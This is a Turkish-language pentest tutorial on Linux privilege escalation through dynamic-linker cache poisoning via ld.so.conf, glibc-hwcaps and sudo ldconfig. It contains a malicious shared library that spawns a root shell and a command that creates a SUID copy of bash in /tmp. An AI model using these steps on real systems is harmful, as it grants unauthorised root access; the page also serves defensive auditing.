# ld.so privesc exploit örneği

Bu sayfa, **`/etc/ld.so.conf` veya `ldconfig` üzerinden system linker cache poisoning** işlemi için hazırlanmış özel bir lab ortamıdır. Eksik library injection, yazılabilir `RPATH`/`RUNPATH`, `LD_PRELOAD` ve diğer genel SUID linker abuse yöntemleri için [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) sayfasına bakın.

## Ortamı hazırlama

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. Bu dosyaları makinenizde aynı klasörde **oluşturun**
2. **library**'yi **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` dosyasını `/usr/lib` klasörüne **kopyalayın** ve cache'i yenileyin: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root yetkileri)
4. **executable**'ı **derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ortamı kontrol edin

_libcustom.so_ dosyasının _/usr/lib_ konumundan **yüklendiğini** ve binary'yi **çalıştırabildiğinizi** kontrol edin.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Faydalı triage komutları

Gerçek bir hedefe saldırırken, binary'nin ihtiyaç duyduğu **tam library adını**, loader'ın **şu anda neyi çözdüğünü** ve live cache'i değiştirmeden hangi yapılandırılmış yolların yazılabilir olduğunu doğrulayın.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` yalnızca **trusted** bir executable üzerinde kullanın. Bazı implementasyonlar veya alışılmadık ELF interpreter'ları, attacker-controlled code çalıştırmasına neden olabilir; `objdump -p ./file | grep NEEDED` doğrudan dependencies listesini güvenli bir şekilde gösterir. **Trusted** bir hedef için, tespit edilen interpreter'ı `--list` ile çağırmak gerçek resolution'ı gösterir.<sup>[[4]](#references)</sup>

Birkaç kullanışlı nokta:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` genellikle **çalışmaz**, çünkü
yönlendirme mevcut shell'iniz tarafından yapılır. Bunun yerine
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` kullanın.
- **SUID/privileged** binary'ler **secure-execution mode** ile çalışır: `LD_LIBRARY_PATH`
yok sayılırken `LD_PRELOAD` kısıtlanır (slash içeren adlar yok sayılır ve yalnızca standard directories içindeki setuid işaretli libraries preload edilebilir). Root `ldconfig` çalıştırdığında, `/etc/ld.so.conf` içinde listelenen directories `/etc/ld.so.cache` içine girebilir; dolayısıyla bu misconfiguration privileged programs'ı hâlâ etkileyebilir.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` de `/etc/suid-debug` mevcut değilse secure-execution mode'da yok sayılır; bu nedenle privileged execution'dan output beklemek yerine trace'i eşdeğer bir non-SUID run'dan toplayın.<sup>[[1]](#references)</sup>
- glibc 2.33 ve sonraki sürümlerde dynamic loader ayrıca
`--list-diagnostics` seçeneğini sunar; bu seçenek, bir hijack beklendiği gibi çalışmadığında machine-readable loader diagnostics ve built-in search-path bilgilerini yazdırır.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache ve SONAME kısıtlamaları

`ldconfig`, configured bir directory içindeki her arbitrary file'ı cache'lemez: ELF headers'ı inceler, `lib*.so*` veya `ld-*.so*` ile eşleşen adları tanır ve geleneksel `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain'ini bekler. Bu nedenle injected object, target architecture/class'a, tam `DT_NEEDED` adına (normalde `DT_SONAME`) ve victim'ın resolve ettiği tüm symbols/versions'a sahip olmalıdır.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Bu örnekteki gibi hedefe özgü bir library tercih edin. Yaygın bir SONAME'i eksik bir object ile shadowing etmek, hedeflenen ayrıcalıklı işlem çalışmadan önce bu SONAME'i çözen her işlemi bozabilir.<sup>[[3]](#references)</sup>

## İstismar

Bu senaryoda, bir yöneticinin sistemin
`/etc/ld.so.conf` dosyası tarafından dahil edilen
`/etc/ld.so.conf.d/` altındaki bir dosyaya vulnerable bir girdi eklediğini
varsayalım.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Savunmasız klasör _/home/ubuntu/lib_ (yazma erişimimizin olduğu yer).\
Aşağıdaki kodu bu yolun içinde **indirin ve derleyin**:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Daha sonra **root** (veya başka bir ayrıcalıklı hesap) tarafından çalıştırılmasını beklediğiniz **vulnerable binary** için genellikle etkileşimli bir shell başlatmak yerine **root sahipliğinde bir artifact** bırakmak daha iyidir. Örneğin:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ardından, ayrıcalıklı çalıştırma gerçekleştikten sonra `/tmp/rootbash -p` komutunu kullanabilirsiniz.

**Kötü amaçlı libcustom kitaplığını yanlış yapılandırılmış** yolun içinde **oluşturduğumuza** göre, varsayılan önbellek başarılı bir ayrıcalıklı **`ldconfig`** çalıştırmasıyla yeniden oluşturulmalıdır. Yeniden başlatma yalnızca yerel önyükleme işlemi bunu gerçekten çağırıyorsa yardımcı olur; aksi takdirde bir yöneticinin işlem yapmasını bekleyin veya mevcutsa güvenli olmayan bir sudo kuralı kullanın.<sup>[[2]](#references)</sup>

Bu gerçekleştikten sonra, `sharedvuln` çalıştırılabilir dosyasının `libcustom.so` kitaplığını nereden yüklediğini **yeniden kontrol edin**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Gördüğünüz gibi **`/home/ubuntu/lib` konumundan yüklüyor** ve herhangi bir kullanıcı bunu çalıştırırsa bir shell çalıştırılacak:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Bu örnekte henüz ayrıcalıkları yükseltmediğimizi unutmayın; ancak yürütülen komutları değiştirerek ve **root veya başka bir ayrıcalıklı kullanıcının güvenlik açığı bulunan binary'yi yürütmesini bekleyerek** ayrıcalıkları yükseltebiliriz.

### Modern `glibc-hwcaps` shadowing

glibc 2.33'ten beri loader, **her library search directory** içindeki `glibc-hwcaps/<level>/` altında bulunan optimize edilmiş library'leri tercih edebilir. Bu nedenle yalnızca `/home/ubuntu/lib` dizinini kontrol etmek yeterli değildir: `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` gibi yazılabilir ve uyumlu bir alt dizin, `ldconfig` bu dizini indexledikten sonra temel library'yi shadow edebilir; diğer CPU'lar ise temel object'i kullanmaya devam eder. Bu durum ayrıca, validation farklı bir CPU üzerinde gerçekleştirildiğinde gözden kaçabilecek architecture-selective bir hijack sağlar.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Mevcut glibc hardening yönergeleri, yinelenen SONAME'lerden, varsayılan olmayan search location'larından ve `glibc-hwcaps` alt dizinlerindeki object'lerden kaçınılmasını önerir. Audit açısından, yapılandırılan dizinlere ve bunların üst path component'lerine ownership ve writeability kontrollerini recursive olarak uygulayın.<sup>[[3]](#references)</sup>

### Diğer misconfiguration'lar - Aynı vuln

Önceki örnekte, bir administrator'ın **bir configuration file içinde, `/etc/ld.so.conf.d/` içerisindeki ayrıcalıksız bir folder'ı tanımladığı** bir misconfiguration'ı sahte olarak oluşturduk.\
Ancak aynı vulnerability'ye neden olabilecek başka misconfiguration'lar da vardır: yüklenen bir **config file** üzerinde **write permissions**'ınız varsa, yazılabilir bir `/etc/ld.so.conf.d/` directory'si içinde bir file oluşturabiliyorsanız veya `/etc/ld.so.conf` üzerine yazabiliyorsanız, aynı vulnerability'yi configure edip exploit edebilirsiniz.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig` üzerinde sudo privileges'ınız olduğunu varsayalım**.\
`-f` ile **`ldconfig`'e hangi configuration file'ı okuyacağını** belirtebilirsiniz; bu nedenle attacker-controlled directory'leri belirten bir file, `ldconfig`'in bu folder'ları cache'e eklemesini sağlayabilir.<sup>[[2]](#references)</sup>\
Öyleyse `"/tmp"`'yi load etmek için gereken file ve folder'ları oluşturalım:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Şimdi, **önceki exploit** bölümünde belirtildiği gibi, **kötü amaçlı kütüphaneyi `/tmp` içinde oluşturun**.\
Son olarak, yolu yükleyelim ve binary'nin kütüphaneyi nereden yüklediğini kontrol edelim:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olduğunuzda aynı güvenlik açığını exploit edebilirsiniz.** Kısıtlanmış bir sudo kuralını değerlendirirken seçeneklerin ayrıntıları önemlidir: `-f` başka bir yapılandırma seçer, ancak yine de `/etc/ld.so.cache` dosyasını yeniden oluşturur; `-C` cache'i başka bir konuma yönlendirir; `-N` cache'in yeniden oluşturulmasını engeller; `-X` ise link güncellemelerini engeller, ancak **`-N` ile birlikte kullanılmadığı sürece cache'i yine de yeniden oluşturur**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
